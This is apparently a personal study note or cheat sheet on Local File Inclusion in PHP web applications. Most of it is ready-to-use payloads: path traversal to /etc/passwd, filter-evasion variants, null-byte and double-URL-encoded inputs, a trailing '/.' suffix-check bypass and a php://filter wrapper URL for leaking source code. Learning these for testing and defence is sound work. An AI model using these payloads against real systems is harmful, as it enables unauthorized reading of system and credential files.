# Local File Inclusion

## Directory path traversal

````txt
../../../../../../etc/passwd
````

-----

### Add multiples characters

When you imagine that exist a replace of "../" to "" you can avoid this with:

````txt
....//....//....//....//....//....//
````

If the replace only drop "../" remain ../ because are double

--------

### When the developer use regular expression

If you detect that is used regular expression you can play with this:

````txt
/etc//////passwd
/etc/./././passwd

````

Or you can use wildcard ( **?** )  to avoid this restriction

````txt
/etc/pass?d
````

---

### When the developer add an extension to the url | null byte injection

**Important**

> The version of php will be less than 5.3.8 or 5.3

If you think that the developer concat a extension when you put the file you can use a null byte:

````bash
../etc/passwd%00
````

%00 is equal to \\0

if the program have to validate that have the extension indicate you can try:

````bash
../etc/passwd%00.jpg
````

---

## Some developer use this script

If the last 6 characters are passwd you don't see nothing

````php
 php -r 'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);' '/etc/passwd'; echo
````

but if you put /etc/hosts, you can see them 

One way to bypass this script in **previous version of php** is that:

> /etc/passwd/.

````php
 php -r 'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);' '/etc/passwd/.'; echo
````

Other example will be this:
We have a validation that prohibit to see all the files that ends in .txt

But if we use **/.** we can bypass this validation
````php
 php -r 'if(substr($argv[1],-4,4)!=".txt") include($argv[1]);' '/tmp/test.txt/.'; echo
````

----

# URL encode

We can URL encode **TWO TIMES** if we have the suspicious if they decode the input

````
../../../../../../..//etc/passwd 
````

````
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66/etc/passwd
````

----

## Using wrappers

Imagine that you want to see the code of php pages, you can refer to the website using **base64 [[Wrappers]]** like this:

Remember when the php code is in base64 is not being interpreted

````python
http://localhost:8081/index.php?page=php://filter/convert.base64-encode/resource=index.php
````


Seguir por: 
==35:15==

----

# Tags

#lfi #wrappers 

---